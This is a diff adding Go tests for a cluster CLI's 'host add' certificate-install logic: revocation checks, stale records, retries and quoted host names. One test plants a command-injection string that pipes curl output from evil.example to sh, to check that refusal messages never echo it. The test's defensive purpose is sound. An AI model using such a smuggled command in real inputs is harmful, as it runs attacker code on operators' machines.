@@ -2,6 +2,7 @@ package cli
 
 import (
 	"bytes"
+	"context"
 	"fmt"
 	"net"
 	"os"
@@ -224,5 +225,189 @@ func TestHostAdd_TheSameNameDoesNotBypassAnotherAdmissionsInstall(t *testing.T) 
 	}
 	if !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), xBytes) {
 		t.Error("the other admission's certificate was replaced")
+	}
+}
+
+// Codex foreign-install I2 residual: the recent-install rule let an add in
+// when the RECORD's serial was revoked, whatever the machine served: a
+// revoked A's record left behind passed a fresh add over a foreign B, and so
+// did a foreign certificate whose serial number this CRL lists. What decides
+// is the certificate installed: nothing, this admission's own, or one this
+// cluster's CA issued and revoked.
+//
+// Mutation: exempt on the record's serial's revocation — both refusals
+// install over B.
+func TestHostAdd_ARecentInstallIsJudgedByTheCertificateInstalled(t *testing.T) {
+	t.Run("a revoked admission's record over a foreign certificate", func(t *testing.T) {
+		f := newAddFixture(t)
+		a := installPair(t, f, f.opPKI, "node-a")
+		revoke(t, f.opPKI, a)
+		writeMarker(t, f.target, fmt.Sprintf("node-a %s %d cafecafe0000 installed\n", a, time.Now().Unix()))
+		installPair(t, f, "", "foreign")
+		bBytes := mustRead(t, filepath.Join(f.targetPKI, "host.crt"))
+		if err := f.add(t); err == nil || !strings.Contains(err.Error(), "installs nothing") {
+			t.Fatalf("add = %v, want refused", err)
+		}
+		if reachedInstall(f.target.Events) || !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), bBytes) {
+			t.Errorf("installed over B: %v", f.target.Events)
+		}
+	})
+	t.Run("another CA's certificate whose serial this CRL lists", func(t *testing.T) {
+		f := newAddFixture(t)
+		b := installPair(t, f, "", "foreign")
+		revoke(t, f.opPKI, b)
+		writeMarker(t, f.target, fmt.Sprintf("node-x %s %d cafecafe0000 installed\n", b, time.Now().Unix()))
+		if err := f.add(t); err == nil || reachedInstall(f.target.Events) {
+			t.Fatalf("add = %v (events %v), want refused", err, f.target.Events)
+		}
+	})
+	t.Run("this cluster's revoked certificate", func(t *testing.T) {
+		f := newAddFixture(t)
+		x := installPair(t, f, f.opPKI, "node-x")
+		revoke(t, f.opPKI, x)
+		writeMarker(t, f.target, fmt.Sprintf("node-x %s %d cafecafe0000 installed\n", x, time.Now().Unix()))
+		if err := f.add(t); err != nil {
+			t.Fatalf("add over a revoked install: %v", err)
+		}
+		servesItsAdmittedPair(t, f.targetPKI, f.client.admitted[0])
+	})
+}
+
+// Our review I2: the name in another attempt's record is the machine's text,
+// and was printed inside the command the operator is told to run. A record
+// whose name is not a host name is not printed or used; nor are an install
+// record's fields that do not parse.
+//
+// Mutation: accept any record name — the refusal prints the injected text.
+func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
+	const evil = "x;curl${IFS}evil.example|sh;#"
+	t.Run("an attempt record", func(t *testing.T) {
+		f := newAddFixture(t)
+		installPair(t, f, "", "foreign")
+		if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
+			[]byte(evil+" -\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		err := f.add(t)
+		if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm x") {
+			t.Fatalf("add = %v, want a refusal that does not echo the record", err)
+		}
+		if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
+			t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
+		}
+	})
+	t.Run("an install record", func(t *testing.T) {
+		f := newAddFixture(t)
+		writeMarker(t, f.target, fmt.Sprintf("%s %s %d %s installing\n", evil, evil, time.Now().Unix(), evil))
+		err := f.add(t)
+		if err == nil || strings.Contains(err.Error(), "curl") {
+			t.Fatalf("add = %v, want a refusal that does not echo the record", err)
+		}
+	})
+}
+
+// Our review m1: an attempt that died after writing its record and before
+// its admission, without unstaging, left a record of a serial no row holds,
+// which outlived the next add and, once that add was removed (its
+// certificate revoked), refused the re-add. Over a certificate this cluster
+// revoked, such a record protects nothing: the re-add goes ahead, and the
+// record goes.
+//
+// Mutation: drop the revoked-certificate exemption from the record scan —
+// the re-add is refused.
+func TestHostAdd_ANeverAdmittedRecordGoesOverARevokedCertificate(t *testing.T) {
+	f := newAddFixture(t)
+	o := installedSerial(f.before["host.crt"])
+	stale := filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before")
+	if err := os.WriteFile(stale, []byte("node-9 "+o+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if err := f.add(t); err != nil {
+		t.Fatalf("first add over the unchanged machine: %v", err)
+	}
+	revoke(t, f.opPKI, f.client.admitted[0]) // lv host rm node-9
+	f.client = &hostAddTestClient{target: f.target, hosts: f.client.hosts[:1]}
+	if err := f.add(t); err != nil {
+		t.Fatalf("re-add over the removed host's certificate: %v", err)
+	}
+	if _, err := os.Stat(stale); !os.IsNotExist(err) {
+		t.Errorf("the never-admitted attempt's record is still there (stat: %v)", err)
+	}
+}
+
+// Our review m2: a retry's expectation comes only from its own serial's
+// records. The admission's own record is gone (as an earlier release's
+// staged add has none), and another serial's record says the machine served
+// B before it: B is still unproven for this admission.
+//
+// Mutation: read every serial's records in recordedExpect — the retry
+// installs over B.
+func TestHostAdd_ARetryReadsOnlyItsOwnSerialsRecords(t *testing.T) {
+	f := newAddFixture(t)
+	serial := strandedAdd(t, f)
+	recs, _ := filepath.Glob(filepath.Join(f.targetPKI, ".host.crt.add-"+serial+"-*.before"))
+	if len(recs) == 0 {
+		t.Fatal("no record of the stranded attempt")
+	}
+	for _, r := range recs {
+		if err := os.Remove(r); err != nil {
+			t.Fatal(err)
+		}
+	}
+	b := installPair(t, f, "", "foreign")
+	if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
+		[]byte("node-x "+b+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	f.target.Events = nil
+	if err := f.add(t); err == nil || reachedInstall(f.target.Events) {
+		t.Fatalf("retry = %v (events %v): installed over B on another serial's record", err, f.target.Events)
+	}
+}
+
+// Coordinator round 2: the install record was split on blanks, so an
+// earlier release's record of a host named "a b" read as name "a", serial
+// "b", and a time that did not parse: a later add of "a" found another
+// admission's recent install a 1970 one and installed over it, and a held
+// claim read as no claim. The name is quoted when it has a blank now, and an
+// earlier release's record is read from the right.
+//
+// Mutation: split on blanks again — both subtests install.
+func TestHostAdd_AHostNameWithABlankIsOneFieldOfTheRecord(t *testing.T) {
+	t.Run("an earlier release's record of a recent install", func(t *testing.T) {
+		f := newAddFixture(t)
+		x := installPair(t, f, f.opPKI, "a b")
+		writeMarker(t, f.target, fmt.Sprintf("a b %s %d cafecafe0000 installed\n", x, time.Now().Unix()))
+		err := HostAddOn(context.Background(), f.client, f.target, "a", "10.0.0.9")
+		if err == nil || !strings.Contains(err.Error(), "installs nothing") || reachedInstall(f.target.Events) {
+			t.Fatalf("add of a = %v (events %v), want refused", err, f.target.Events)
+		}
+	})
+	t.Run("an earlier release's held claim", func(t *testing.T) {
+		f := newAddFixture(t)
+		writeMarker(t, f.target, fmt.Sprintf("a b abcd %d cafecafe0000 installing\n", time.Now().Unix()))
+		err := HostAddOn(context.Background(), f.client, f.target, "a", "10.0.0.9")
+		if err == nil || !strings.Contains(err.Error(), "holds this machine") || reachedInstall(f.target.Events) {
+			t.Fatalf("add of a = %v, want the held claim's refusal", err)
+		}
+	})
+	for _, tc := range []struct {
+		line string
+		want []string
+	}{
+		{markerLine("a b", "abcd", 7, "0123456789ab", "installed"), []string{"a b", "abcd", "7", "0123456789ab", "installed"}},
+		{markerLine(`q"t`, "abcd", 7, "0123456789ab", "installing"), []string{`q"t`, "abcd", "7", "0123456789ab", "installing"}},
+		{markerLine("node-9", "abcd", 7, "0123456789ab", "installed"), []string{"node-9", "abcd", "7", "0123456789ab", "installed"}},
+		{"node-9 abcd 7 0123456789ab installed", []string{"node-9", "abcd", "7", "0123456789ab", "installed"}},
+		{"a b abcd 7 0123456789ab installed", []string{"a b", "abcd", "7", "0123456789ab", "installed"}},
+		{"a b abcd 7 0123456789ab", []string{"a b", "abcd", "7", "0123456789ab"}},
+		{"node-9 abcd 7", []string{"node-9", "abcd", "7"}},
+	} {
+		if got := markerFields(tc.line); strings.Join(got, "|") != strings.Join(tc.want, "|") {
+			t.Errorf("markerFields(%q) = %q, want %q", tc.line, got, tc.want)
+		}
+	}
+	if markerLine("node-9", "abcd", 7, "0123456789ab", "installed") != "node-9 abcd 7 0123456789ab installed" {
+		t.Error("a plain name's record is not byte-identical to an earlier release's")
 	}
 }
